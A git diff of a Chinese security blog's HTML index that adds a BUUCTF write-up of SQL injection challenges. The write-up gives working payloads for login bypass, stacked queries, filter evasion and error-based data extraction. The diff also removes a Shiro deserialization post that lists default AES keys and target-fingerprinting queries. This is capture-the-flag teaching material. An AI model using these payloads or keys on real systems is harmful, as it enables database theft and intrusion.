@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">85</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">86</span></a>
 
   </li>
   </ul>
@@ -156,6 +156,220 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">极客大挑战2019-SQl注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-13 16:44:53 / 修改时间：17:00:23" itemprop="dateCreated datePublished" datetime="2023-11-13T16:44:53+08:00">2023-11-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="SQL注入-BUUCTF-SQL注入题解"><a href="#SQL注入-BUUCTF-SQL注入题解" class="headerlink" title="SQL注入|BUUCTF SQL注入题解"></a>SQL注入|BUUCTF SQL注入题解</h1><p>[[极客大挑战 2019]EasySQL 1](#[极客大挑战 2019]EasySQL 1)</p>
+<p>[[SUCTF 2019]EasySQL](#[SUCTF 2019]EasySQL)</p>
+<p>[[极客大挑战 2019]BabySQL](#[极客大挑战 2019]BabySQL)</p>
+<p>[[极客大挑战 2019]LoveSQL](#[极客大挑战 2019]LoveSQL)</p>
+<p>[[极客大挑战 2019]HardSQL](#[极客大挑战 2019]HardSQL)</p>
+<h2 id="极客大挑战-2019-EasySQL-1"><a href="#极客大挑战-2019-EasySQL-1" class="headerlink" title="[极客大挑战 2019]EasySQL 1"></a>[极客大挑战 2019]EasySQL 1</h2><p>【难度】：几乎没有任何防御手段</p>
+<p>登录界面，弱口令、万能密码走一波</p>
+<p>l  弱口令</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164625418.png" alt="image-20231113164625418"></p>
+<p>l  万能密码</p>
+<p>万能密码：’or 1=1–+’</p>
+<p>说明：“–”是注释符，利用“–”闭合的时候，其后要跟“空格”，“+”就是url编码后的空格 符</p>
+<p>?username=’or 1=1–+’&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164705027.png" alt="image-20231113164705027"></p>
+<p>成功拿到flag</p>
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>l  正常输入，看回显</p>
+<p>输入1</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image005.png" alt="img"></p>
+<p>一开始以为输入数字x，就输出Array（[0]=&gt;x），尝试其他数字输入后，发现这是一个逻辑判断。输入&gt;0的输入，输出均为Array（[0]=&gt;1）；输入0时，没有输出。猜测内设的sql语句是布尔逻辑语句</p>
+<p>l  输入万能密码’or 1=1’</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image006.png" alt="img"></p>
+<p>尝试普通的sql注入，返回均为Nonono</p>
+<p><strong>解法：堆叠注入</strong></p>
+<p>l  查数据库</p>
+<p><strong>payload</strong>：database()#  或者 1,database()# 或者1; database()#等都可</p>
+<p>“#”可以用“;”替换。</p>
+<p>l  payload：1,database()#的结果</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image007.png" alt="img"></p>
+<p>l  payload :1; database()；的结果</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164737704.png" alt="image-20231113164737704"></p>
+<p><strong>获得数据库名：ctf</strong></p>
+<p>l  查表明</p>
+<p>l  Payload：1;show table;</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/clip_image011.jpg" alt="img"></p>
+<p><strong>获得表名：Flag</strong></p>
+<p><strong>！！！到这里，，猜测该系统后台内置的sql语句为：</strong></p>
+<p>select $_POST[‘query’] || flag from flag [1] </p>
+<p>或者sql=”select”.sql=”select”.post[‘query’].”||flag from Flag”;</p>
+<p>l  <strong>题解payload1：*.1</strong></p>
+<p>如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113164805520.png" alt="image-20231113164805520"></p>
+<p>l  <strong>题解payload2：1;set sql_mode=pipes_as_concat;select 1</strong></p>
+<p><strong>set sql_mode=pipes_as_concat：</strong>把“||” 设置为“or”，但mysql8.0版本后取消了</p>
+<p>sql语句就变成了select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag，也就是select 1 or select 1 from Flag</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165007891.png" alt="image-20231113165007891"></p>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>l  万能密码走一波</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165025565.png" alt="image-20231113165025565"></p>
+<p>发现关键字“or”被过滤了，注意“+”被编码为空格了，并没有被过滤；尝试其他的关键后，发现大部分关键字都被过滤了。</p>
+<p><strong>【绕过方法】重写绕过</strong></p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165038935.png" alt="image-20231113165038935"></p>
+<p>l  <strong>获取数据库</strong></p>
+<p>Payload：1’ ununionion seselectlect 1,database(),2–+&amp;password=123456</p>
+<p>获取到数据名：geek</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165053106.png" alt="image-20231113165053106"></p>
+<p>l  <strong>获取表名</strong></p>
+<p>Payload：?username=1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()–+&amp;password=123456</p>
+<p>注意要替换所有关键字，例如information也存在from，需要重写并替换为infoorrmation。</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165113765.png" alt="image-20231113165113765"></p>
+<p>l  <strong>获取字段名</strong></p>
+<p><strong>查看全部表的列名Payload</strong>：?username=1’ ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database()–+&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165129244.png" alt="image-20231113165129244"></p>
+<p><strong>查看单个表的列名payload</strong>：?username=1’ uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=”b4bsql”–+&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165146057.png" alt="image-20231113165146057"></p>
+<p>l  <strong>查看字段</strong></p>
+<p>?username=1’ ununionion seselectlect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql–+&amp;password=123456–+</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165201636.png" alt="image-20231113165201636"></p>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>² <strong>万能密码走一波</strong></p>
+<p>Payload：?username=’ or 1=1–+’&amp;password=’ or 1=1’</p>
+<p>注意：“–+”注释符不要漏</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165215075.png" alt="image-20231113165215075"></p>
+<p>拿到账号密码（加密），且知道存在sql注入漏洞</p>
+<p>² <strong>判断注入点数与位置</strong></p>
+<p>Payload：?username=1’ union select 1,2,3–+’&amp;password=’ or 1=1’</p>
+<p>这里的“1”可有可无，“‘ ’ ”构成闭合即可</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165231604.png" alt="image-20231113165231604"></p>
+<p>² <strong>获取数据库</strong></p>
+<p>Payload：?username=1’union select 1,2,database()–+’&amp;password=’ or 1=1’</p>
+<p>数据库：geek</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165245349.png" alt="image-20231113165245349"></p>
+<p>² <strong>获取表名</strong></p>
+<p>Payload：?username=1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+’&amp;password=’ or 1=1’</p>
+<p>表名：geekuser、l0ve1ysq1</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165259421.png" alt="image-20231113165259421"></p>
+<p>² <strong>获取字段名</strong></p>
+<p>获取l0ve1ysq1表的字段名payload：?username=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name= ‘<strong>l0ve1ysq1</strong>‘–+’&amp;password=’ or 1=1’</p>
+<p>字段名：id、username、password</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165315390.png" alt="image-20231113165315390"></p>
+<p>² <strong>获取数据</strong></p>
+<p>Payload: ?username=1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1–+’&amp;password=’ or 1=1’</p>
+<p>这里的flag只截取了部分，剩下部分在左边，滑动可以找到</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165332517.png" alt="image-20231113165332517"></p>
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>经过测试，发现站点禁用了空格、#、大部分常用的关键字等等。</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165345912.png" alt="image-20231113165345912"></p>
+<p>存在报错回显</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165400764.png" alt="image-20231113165400764"></p>
+<p>禁用了大部分关键字且没有回显位置；只有报错回显，所以尝试“报错注入”。</p>
+<p><strong>思路</strong>：对于空格和#等字符，可以采取替换的绕过方式，例如：</p>
+<p>空格替换：括号（）、</p>
+<p>#：编码</p>
+<p>or：异或符号^</p>
+<p>l  <strong>报错注入</strong></p>
+<p>常用函数</p>
+<p>² <strong>Updatexml()</strong></p>
+<p><strong>用法</strong>：updatexml(XML_document, XPath_string, new_value）</p>
+<p>-   XML_document是string格式，为XML文档对象的名称，列入Doc</p>
+<p>-   XPath_string是路径，XPath格式的字符串。</p>
+<p>-   new_value,string格式，替换查找到的符合条件的数据</p>
+<p><strong>报错技巧</strong>：由于XPath_string文件路径基本都是以“/”开头，所以用其他字符开头就可能会报错，例如“~”、</p>
+<p>² <strong>Extractvalue()</strong></p>
+<p><strong>用法</strong>：extractvalue(XML_document,XPath_string)</p>
+<p>-   XML_document指xml文档对象（文件名）</p>
+<p>-   XPath_string指文件路径</p>
+<p><strong>报错技巧</strong>：由于XPath_string文件路径基本都是以“/”开头，所以用其他字符开头就可能会报错，例如“~”、</p>
+<p>l  <strong>题解</strong></p>
+<p>² <strong>获取数据库</strong></p>
+<p><strong>Updatexml报错payload：</strong></p>
+<p>?username=1’^updatexml(1,concat(0x7e,(select(database()))),3)%23&amp;password=123456</p>
+<p>或?username=1’^updatexml(1,concat(‘~’,(select(database()))),3)%23&amp;password=123456</p>
+<p>-   0x7e：16进制数，ASCII码对应的字符是“<del>”；为了隐蔽，常用编码值0X7e而不是“</del>”。</p>
+<p>-   %23：url编码，对应的字符是“#”；这里不能直接用–+，因为没有引号构造闭合。</p>
+<p>-   1后面的“ ’ ’”不能漏，要构造闭合</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165422902.png" alt="image-20231113165422902"></p>
+<p><strong>Extractvalue报错payload：</strong></p>
+<p>?username=1’^extractvalue(1,concat(0x5c,(select(database()))))%23</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165437962.png" alt="image-20231113165437962"></p>
+<p>数据库：geek</p>
+<p>² <strong>获取表名</strong></p>
+<p>Payload：1’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’))))%23&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165453466.png" alt="image-20231113165453466"></p>
+<p>表名：H4rDsq1</p>
+<p>² <strong>获取字段名</strong></p>
+<p>Payload：?username=1’^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’))))%23&amp;password=123456</p>
+<p>注意：and也被ban了的</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165508705.png" alt="image-20231113165508705"></p>
+<p>字段名：id、username、password</p>
+<p>² <strong>获取数据</strong></p>
+<p>Payload：?username=1’^extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1))))%23&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165521812.png" alt="image-20231113165521812"></p>
+<p>发现只有半截flag，原因是回显的消息有长度限制。可以采取分块截取的方式获取完整的flag。注意，需要自己查找flag在那个字段下。</p>
+<p><strong>获取前（左）30个字符</strong></p>
+<p>Payload：?username=1’^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23&amp;password=123456</p>
+<p>注意：当有且仅有一个表叫H4rDsq1时，geek.H4rDsq1与H4rDsq1是等价的，geek.H4rDsq1只是指定了数据库geek。</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165536158.png" alt="image-20231113165536158"></p>
+<p><strong>获取后（右）30个字符</strong></p>
+<p>Payload：?username=1’^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165547343.png" alt="image-20231113165547343"></p>
+<p>根据从左和从右获取的flag，拼接成完整的flag即可；注意有重叠的地方要删除。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -179,10 +393,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-08-17 11:48:06 / 修改时间：15:13:35" itemprop="dateCreated datePublished" datetime="2023-08-17T11:48:06+08:00">2023-08-17</time>
+              <time title="创建时间：2023-08-17 11:48:06" itemprop="dateCreated datePublished" datetime="2023-08-17T11:48:06+08:00">2023-08-17</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-22 16:28:27" itemprop="dateModified" datetime="2023-08-22T16:28:27+08:00">2023-08-22</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -308,7 +528,7 @@
 </ul>
 <p>l <strong>Win10打开新的poc.docx</strong></p>
 <p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150804168.png" alt="image-20230817150804168"></p>
-<p>l <strong>Kali**</strong>接收到请求服务**</p>
+<p>l <strong>Kali接收到请求服务</strong></p>
 <p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150821773.png" alt="image-20230817150821773"></p>
 <p>l <strong>win系统上线CS</strong></p>
 <p> <img src="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/image-20230817150845091.png" alt="image-20230817150845091"></p>
@@ -1511,447 +1731,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" class="post-title-link" itemprop="url">shiro反序列化漏洞集合</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-08-13 18:00:08" itemprop="dateCreated datePublished" datetime="2023-08-13T18:00:08+08:00">2023-08-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-08-14 20:16:08" itemprop="dateModified" datetime="2023-08-14T20:16:08+08:00">2023-08-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Shiro反序列漏洞集合"><a href="#Shiro反序列漏洞集合" class="headerlink" title="Shiro反序列漏洞集合"></a>Shiro反序列漏洞集合</h1><p><strong>免责声明</strong></p>
-<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
-<h2 id="漏洞介绍与知识补充"><a href="#漏洞介绍与知识补充" class="headerlink" title="漏洞介绍与知识补充"></a>漏洞介绍与知识补充</h2><p>​    Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p>
-<p><strong>【已知指纹</strong>】</p>
-<p>若依CMS、TIMO后台管理系统</p>
-<p>Bp抓包：在登陆界面勾线记住密码，进行抓包，找remeberMe字段。</p>
-<p>【<strong>Fofa语法</strong>】</p>
-<ul>
-<li><p> “shiro” &amp;&amp;“管理系统”</p>
-</li>
-<li><p> header=“rememberme=deleteMe”、header=“shiroCookie”</p>
-</li>
-</ul>
-<p>【<strong>注意</strong>】shiro反序列化漏洞并不需要正确的账号密码，触发漏洞的点是在于反序列化过程，需要密钥Key，是因为要把攻击payload解密回正确的payload（否则解密出乱码）；然后利用反序列化的利用链进行触发反序列化漏洞。</p>
-<p><strong>Shiro默认key集合</strong></p>
-<table>
-<thead>
-<tr>
-<th>序号</th>
-<th>shiro版本</th>
-<th>默认密钥</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td></td>
-<td>kPH+bIxk5D2deZiIxcaaaA==</td>
-</tr>
-<tr>
-<td>2</td>
-<td></td>
-<td>4AvVhmFLUs0KTA3Kprsdag==</td>
-</tr>
-<tr>
-<td>3</td>
-<td></td>
-<td>3AvVhmFLUs0KTA3Kprsdag==</td>
-</tr>
-<tr>
-<td>4</td>
-<td></td>
-<td>2AvVhdsgUs0FSA3SDFAdag==</td>
-</tr>
-<tr>
-<td>5</td>
-<td></td>
-<td>6ZmI6I2j5Y+R5aSn5ZOlAA==</td>
-</tr>
-<tr>
-<td>6</td>
-<td></td>
-<td>wGiHplamyXlVB11UXWol8g==</td>
-</tr>
-<tr>
-<td>7</td>
-<td></td>
-<td>cmVtZW1iZXJNZQAAAAAAAA==</td>
-</tr>
-<tr>
-<td>8</td>
-<td></td>
-<td>Z3VucwAAAAAAAAAAAAAAAA==</td>
-</tr>
-<tr>
-<td>9</td>
-<td></td>
-<td>ZnJlc2h6Y24xMjM0NTY3OA==</td>
-</tr>
-<tr>
-<td>10</td>
-<td></td>
-<td>L7RioUULEFhRyxM7a2R/Yg==</td>
-</tr>
-<tr>
-<td>11</td>
-<td></td>
-<td>RVZBTk5JR0hUTFlfV0FPVQ==</td>
-</tr>
-<tr>
-<td>12</td>
-<td></td>
-<td>fCq+/xW488hMTCD+cmJ3aQ==</td>
-</tr>
-<tr>
-<td>13</td>
-<td></td>
-<td>WkhBTkdYSUFPSEVJX0NBVA==</td>
-</tr>
-<tr>
-<td>14</td>
-<td></td>
-<td>1QWLxg+NYmxraMoxAXu/Iw==</td>
-</tr>
-<tr>
-<td>15</td>
-<td></td>
-<td>WcfHGU25gNnTxTlmJMeSpw==</td>
-</tr>
-<tr>
-<td>16</td>
-<td></td>
-<td>a2VlcE9uR29pbmdBbmRGaQ==</td>
-</tr>
-<tr>
-<td>17</td>
-<td></td>
-<td>bWluZS1hc3NldC1rZXk6QQ==</td>
-</tr>
-<tr>
-<td>18</td>
-<td></td>
-<td>5aaC5qKm5oqA5pyvAAAAAA==</td>
-</tr>
-<tr>
-<td>19</td>
-<td></td>
-<td>ZWvohmPdUsAWT3=KpPqda</td>
-</tr>
-<tr>
-<td>20</td>
-<td></td>
-<td>r0e3c16IdVkouZgk1TKVMg==</td>
-</tr>
-<tr>
-<td>21</td>
-<td></td>
-<td>ZUdsaGJuSmxibVI2ZHc9PQ==</td>
-</tr>
-<tr>
-<td>22</td>
-<td></td>
-<td>U3ByaW5nQmxhZGUAAAAAAA==</td>
-</tr>
-<tr>
-<td>23</td>
-<td></td>
-<td>LEGEND-CAMPUS-CIPHERKEY==</td>
-</tr>
-<tr>
-<td>24</td>
-<td></td>
-<td>kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</td>
-</tr>
-<tr>
-<td>25</td>
-<td></td>
-<td>LEGEND-CAMPUS-CIPHERKEY==</td>
-</tr>
-<tr>
-<td>26</td>
-<td></td>
-<td>kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</td>
-</tr>
-</tbody></table>
-<h2 id="RememberMe-RCE-550（CVE-2016-4437）"><a href="#RememberMe-RCE-550（CVE-2016-4437）" class="headerlink" title="RememberMe RCE-550（CVE-2016-4437）"></a>RememberMe RCE-550（CVE-2016-4437）</h2><h3 id="0x01-漏洞介绍-原理"><a href="#0x01-漏洞介绍-原理" class="headerlink" title="0x01 漏洞介绍/原理"></a>0x01 漏洞介绍/原理</h3><p>​        Apache Shiro框架提供了记住我（RememberMe）的功能，关闭浏览器再次访问时无需再登录即可访问。shiro默认使用CookieRememberMeManager对rememberMe的cookie执行操作在客户端进行，如操作j，服务器端识别身份解密处理cookie的流程为操作k：</p>
-<ul>
-<li><p><strong>（客户端/浏览器）操作j：序列化⟶AES加密⟶Base64编码</strong></p>
-</li>
-<li><p><strong>（服务器）操作</strong>k<strong>：获取rememberMe cookie⟶base64 解码⟶AES解密（加密密钥硬编码）⟶反序列化（未作过滤处理）</strong></p>
-</li>
-</ul>
-<p>【<strong>漏洞所在</strong>】</p>
-<p>​        AES加密的默认密钥Key写死在官方的代码里(密钥初始就被定义好不能动态改变的)，这就意味着可以通过源代码都能拿到AES加密的默认密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都可能会导致该漏洞的产生。</p>
-<h3 id="0x02-漏洞环境-测绘指纹"><a href="#0x02-漏洞环境-测绘指纹" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><p>Apache Shiro &lt;= 1.2.4</p>
-<p>指纹：shiro通用指纹</p>
-<h3 id="0x03-POC-EXP-漏洞利用"><a href="#0x03-POC-EXP-漏洞利用" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h3><ul>
-<li><strong>步骤1：制作bash反弹shell</strong></li>
-</ul>
